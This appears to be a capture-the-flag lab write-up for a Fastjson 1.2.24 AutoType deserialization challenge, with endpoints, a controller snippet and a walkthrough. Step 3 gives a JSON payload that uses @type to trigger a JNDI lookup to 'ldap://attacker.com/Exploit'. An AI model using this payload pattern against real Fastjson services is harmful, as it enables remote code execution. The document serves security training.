# Level 2 — Fastjson Deserialization

## Challenge Description

This challenge simulates a user config service using Fastjson 1.2.24 to parse user-submitted JSON. AutoType is enabled by default in this version. Attackers can use the `@type` field to target `FastjsonGadget` and trigger JNDI injection via setter chain.

**Objective**: Craft malicious JSON with `@type` to trigger Fastjson AutoType RCE and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `FastjsonController.java`

```
GET  /api/challenge/deser/fastjson/info    — Get system info (includes Fastjson version)
GET  /api/challenge/deser/fastjson/gadget  — Get gadget class info
POST /api/challenge/deser/fastjson/update  — Update config (vulnerable entry)
```

**System Info**: Fastjson 1.2.24 (AutoType enabled by default)

**Gadget Class**: `FastjsonGadget` — `setAutoCommit(true)` triggers JNDI lookup when `dataSourceName` is set

**Vulnerability**: `JSON.parseObject()` processes `@type` field, instantiating `FastjsonGadget` and calling its setters. `setAutoCommit(true)` performs JNDI lookup.

### Source Code Snippet

```java
Object parsed = JSON.parseObject(rawBody);  // AutoType enabled
String executionResult = FastjsonGadget.getAndClearResult();
if (executionResult != null) {
    String flag = flagService.getFlag("deserialization", "level2");
    result.put("flag", flag);
}
```

## Walkthrough

### Step 1: Get System Info

```
GET /api/challenge/deser/fastjson/info
```

### Step 2: Get Gadget Class Info

```
GET /api/challenge/deser/fastjson/gadget
```

### Step 3: Craft Malicious JSON

```json
POST /api/challenge/deser/fastjson/update
{
  "@type": "com.madrabbit.challenge.deser.FastjsonGadget",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}
```

### Step 4: Capture the Flag

The response contains the Flag when RCE is triggered.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/deserialization/FastjsonController.java` | Backend Fastjson parsing endpoint |
| `challenge/deser/FastjsonGadget.java` | Gadget chain class |
| `service/FlagService.java` | Flag retrieval and validation |
